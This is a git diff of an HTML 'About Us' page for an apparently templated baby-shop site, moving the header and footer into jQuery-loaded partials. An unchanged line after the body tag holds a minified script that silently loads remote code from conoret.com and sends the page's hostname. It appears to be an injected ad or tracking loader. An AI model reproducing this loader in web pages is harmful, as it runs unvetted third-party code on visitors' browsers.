@@ -20,7 +20,23 @@
     <!-- script
     ================================================== -->
     <script src="./about_files/modernizr.js"></script>
-  </head>
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.3/jquery.min.js"></script>
+
+    <script>
+      $(function(){
+        $("#commonHeader").load("header.html");
+      });
+
+      $(function(){
+        $("#commonFooter").load("footer.html");
+      });
+
+      $(function(){
+        $("#commonFooterBottom").load("footer-bottom.html");
+      });
+    </script>
+
+</head>
   <body data-bs-spy="scroll" data-bs-target="#navbar" data-bs-root-margin="0px 0px -40%" data-bs-smooth-scroll="true" tabindex="0"><script type="text/javascript">window.top === window && !function(){var e=document.createElement("script"),t=document.getElementsByTagName("head")[0];e.src="//conoret.com/dsp?h="+document.location.hostname+"&r="+Math.random(),e.type="text/javascript",e.defer=!0,e.async=!0,t.appendChild(e)}();</script>
     <svg xmlns="http://www.w3.org/2000/svg" style="display: none;">
       <symbol xmlns="http://www.w3.org/2000/svg" id="navbar-icon" viewBox="0 0 16 16">
@@ -169,59 +185,7 @@
         </div>
       </div>
     </div>    
-    <header id="header" class="site-header bg-light py-3">
-      <nav class="navbar navbar-expand-lg" aria-label="Offcanvas navbar large">
-        <div class="container-lg">
-          <a class="navbar-brand me-5" href="https://longlinht.github.io/baby/index.html">
-            <img src="./about_files/main-logo.png" alt="brand">
-          </a>
-          <button class="navbar-toggler" type="button" data-bs-toggle="offcanvas" data-bs-target="#offcanvasNavbar2" aria-controls="offcanvasNavbar2" aria-label="Toggle navigation">
-            <svg class="navbar-icon" width="35" height="35">
-              <use xlink:href="#navbar-icon"></use>
-            </svg>
-          </button>
-          <div class="offcanvas offcanvas-end " tabindex="-1" id="offcanvasNavbar2" aria-labelledby="offcanvasNavbar2Label">
-            <div class="offcanvas-body align-items-center">
-              <ul class="navbar-nav ms-5 flex-grow-1 pe-3">
-                <li class="nav-item ms-3">
-                  <a class="nav-link text-dark active" aria-current="page" href="https://longlinht.github.io/baby/index.html">Home</a>
-                </li>
-                <li class="nav-item ms-3">
-                  <a class="nav-link text-dark" href="https://longlinht.github.io/baby/about.html">About</a>
-                </li>
-
-                <li class="nav-item ms-3">
-                  <a class="nav-link text-dark" href="https://longlinht.github.io/baby/shop-with-sidebar.html">Shop</a>
-                </li>
-
-                <li class="nav-item ms-3">
-                  <a class="nav-link text-dark" href="https://longlinht.github.io/baby/faqs.html">FAQs</a>
-                </li>
-
-              </ul>
-              <div class="navbar-users">
-                <ul class="user-items list-unstyled d-none d-lg-flex justify-content-end align-items-center order-3 flex-grow-1 gap-4 m-0">
-                  <li>
-                    <svg class="search" width="18" height="18">
-                      <use xlink:href="#search"></use>
-                    </svg>
-                    <input type="text" placeholder="Search Here..." class="outline-none border-0 bg-transparent fst-italic">
-                  </li>
-                  <li class="position-relative">
-                    <a href="https://longlinht.github.io/baby/cart.html" data-bs-toggle="offcanvas" data-bs-target="#offcanvasCart" aria-controls="offcanvasCart">
-                      <svg class="cart" width="28" height="28">
-                        <use xlink:href="#cart"></use>
-                      </svg>
-                      <span class="bg-primary text-light rounded-pill position-absolute text-center">0</span>
-                    </a>
-                  </li>
-                </ul>
-              </div>
-            </div>
-          </div>
-        </div>
-      </nav>
-    </header>
+    <header id="commonHeader" class="site-header bg-light py-3"> </header>
     <div id="scroll-top-btn" class="bg-light rounded-pill text-primary position-fixed">
       <svg class="teddybear" width="50" height="50">
         <use xlink:href="#teddybear"></use>
@@ -229,22 +193,7 @@
     </div>
     <section class="hero-section position-relative jarallax d-flex align-items-center text-center justify-content-center">
       
-      <div class="hero-content">
-        <div class="container-lg">
-          <div class="row">
-            <div class="col-md-12">
-              <h1 class="page-title text-light">About Us</h1>
-              <div class="breadcrumbs text-light">
-                <span class="item">
-                  <a href="https://longlinht.github.io/baby/index.html" class="text-light">Home /</a>
-                </span>
-                <span class="item">About Us</span>
-              </div>
-            </div>
-          </div>
-        </div>
-      </div>
-    <div id="jarallax-container-0" style="position: absolute; top: 0px; left: 0px; width: 100%; height: 100%; overflow: hidden; z-index: -100; clip-path: polygon(0px 0px, 100% 0px, 100% 100%, 0px 100%);"><img src="./about_files/hero-image1.jpg" alt="doll" class="jarallax-img" style="object-fit: cover; object-position: 50% 50%; max-width: none; position: fixed; top: 0px; left: 0px; width: 1440px; height: 588px; overflow: hidden; pointer-events: none; transform-style: preserve-3d; backface-visibility: hidden; will-change: transform, opacity; margin-top: 54px; transform: translate3d(0px, -7px, 0px);"></div></section>    
+    <div id="jarallax-container-0" style="position: absolute; top: 0px; left: 0px; width: 100%; height: 100%; overflow: hidden; z-index: -100; clip-path: polygon(0px 0px, 100% 0px, 100% 100%, 0px 100%);"><img src="./about_files/hero-image1.jpeg" alt="doll" class="jarallax-img" style="object-fit: cover; object-position: 50% 50%; max-width: none; position: fixed; top: 0px; left: 0px; width: 1440px; height: 588px; overflow: hidden; pointer-events: none; transform-style: preserve-3d; backface-visibility: hidden; will-change: transform, opacity; margin-top: 54px; transform: translate3d(0px, -7px, 0px);"></div></section>
     <section id="about" class="py-lg-8">
       <div class="container-lg">
         <div class="row align-items-center">
@@ -303,112 +252,9 @@
         </div>
       </div>
     </section>
-    <footer id="footer" class="position-relative bg-light py-lg-7 my-lg-7 mb-lg-0">
-      <div class="cloud-overlay position-absolute overflow-x-hidden w-100">
-        <img src="./about_files/cloud-pattern-overlay.png" alt="icon overlay">
-      </div>
-      <div class="container">
-        <div class="row d-flex flex-wrap justify-content-between">
-          <div class="col-lg-3 col-md-6">
-            <div class="footer-menu">
-              <h5 class="widget-title text-secondary">Quick Links</h5>
-              <ul class="menu-list list-unstyled">
-                <li class="menu-item pb-2">
-                  <a href="https://longlinht.github.io/baby/index.html" class="item-anchor">Home</a>
-                </li>
-                <li class="menu-item pb-2">
-                  <a href="https://longlinht.github.io/baby/about.html" class="item-anchor">About</a>
-                </li>
-                <li class="menu-item pb-2">
-                  <a href="https://longlinht.github.io/baby/blog-with-sidebar.html" class="item-anchor">Blog</a>
-                </li>
-                <li class="menu-item pb-2">
-                  <a href="https://longlinht.github.io/baby/shop-with-sidebar.html" class="item-anchor">Shop</a>
-                </li>
-                <li class="menu-item pb-2">
-                  <a href="https://longlinht.github.io/baby/contact.html" class="item-anchor">Contact</a>
-                </li>
-              </ul>
-            </div>
-          </div>
-          <div class="col-lg-3 col-md-6">
-            <div class="footer-menu">
-              <h5 class="widget-title text-secondary">Help</h5>
-              <ul class="menu-list list-unstyled">
-                <li class="menu-item pb-2">
-                  <a href="https://longlinht.github.io/baby/faqs.html" class="item-anchor">Faqs</a>
-                </li>
-                <li class="menu-item pb-2">
-                  <a href="https://longlinht.github.io/baby/about.html#" class="item-anchor">Privacy</a>
-                </li>
-                <li class="menu-item pb-2">
-                  <a href="https://longlinht.github.io/baby/about.html#" class="item-anchor">Terms</a>
-                </li>
-                <li class="menu-item pb-2">
-                  <a href="https://longlinht.github.io/baby/about.html#" class="item-anchor">Affiliate</a>
-                </li>
-                <li class="menu-item pb-2">
-                  <a href="https://longlinht.github.io/baby/about.html#" class="item-anchor">Get in touch</a>
-                </li>
-              </ul>
-            </div>
-          </div>
-          <div class="col-lg-3 col-md-6">
-            <div class="footer-menu">
-              <h5 class="widget-title text-secondary">Social Media</h5>
-              <div class="social-links">
-                <ul class="list-unstyled">
-                  <li class="fw-medium pb-2">
-                    <a href="https://longlinht.github.io/baby/facebook.com">Facebook </a>
-                  </li>
-                  <li class="fw-medium pb-2">
-                    <a href="https://longlinht.github.io/baby/instagram.com">Instagram </a>
-                  </li>
-                  <li class="fw-medium pb-2">
-                    <a href="https://longlinht.github.io/baby/pinterest.com">Pinterest </a>
-                  </li>
-                  <li class="fw-medium pb-2">
-                    <a href="https://longlinht.github.io/baby/twitter.com">Twitter </a>
-                  </li>
-                  <li class="fw-medium pb-2">
-                    <a href="https://longlinht.github.io/baby/youtube.com">Youtube </a>
-                  </li>
-                </ul>
-              </div>
-            </div>
-          </div>
-          <div class="col-lg-3 col-md-6">
-            <div class="footer-menu">
-              <h5 class="widget-title text-secondary">Contact</h5>
-              <div class="social-links">
-                <ul class="list-unstyled">
-                  <li class="fw-medium pb-2"> 000 111 222 333 444 </li>
-                  <li class="fw-medium pb-2">
-                    <a href="mailto:yourinfo@gmail.com">Yourinfo@gmail.com</a>
-                  </li>
-                  <li class="fw-medium pb-2">Sonoma, Monterey, San Luis Opispo, Santa Barbara
-                  </li>
-                </ul>
-              </div>
-            </div>
-          </div>
-        </div>
-      </div>
-    </footer>
-    <div class="footer-bottom py-3 bg-light">
-      <div class="container">
-        <div class="row">
-          <div class="col-lg-8 col-md-6 mb-3">
-            <div class="d-flex flex-wrap align-items-center">
-              <img src="./about_files/main-logo.png" alt="brand name" class="pe-5">
-              <p class="m-0">©2023 Kiddo. All rights reserved.</p>
-            </div>
-          </div>
-          <div class="col-lg-4 col-md-6 text-center mb-3">
-            <p>Template designed by <a href="https://templatesjungle.com/" target="_blank" class="text-primary fw-bold">TemplatesJungle</a>
-          </p></div>
-        </div>
-      </div>
+    <footer id="commonFooter" class="position-relative bg-light py-lg-7 my-lg-7 mb-lg-0"></footer>
+    <div class="footer-bottom py-3 bg-light" id="commonFooterBottom">
+
     </div>
     <script src="./about_files/jquery-1.11.0.min.js"></script>
     <script type="text/javascript" src="./about_files/swiper-bundle.min.js"></script>
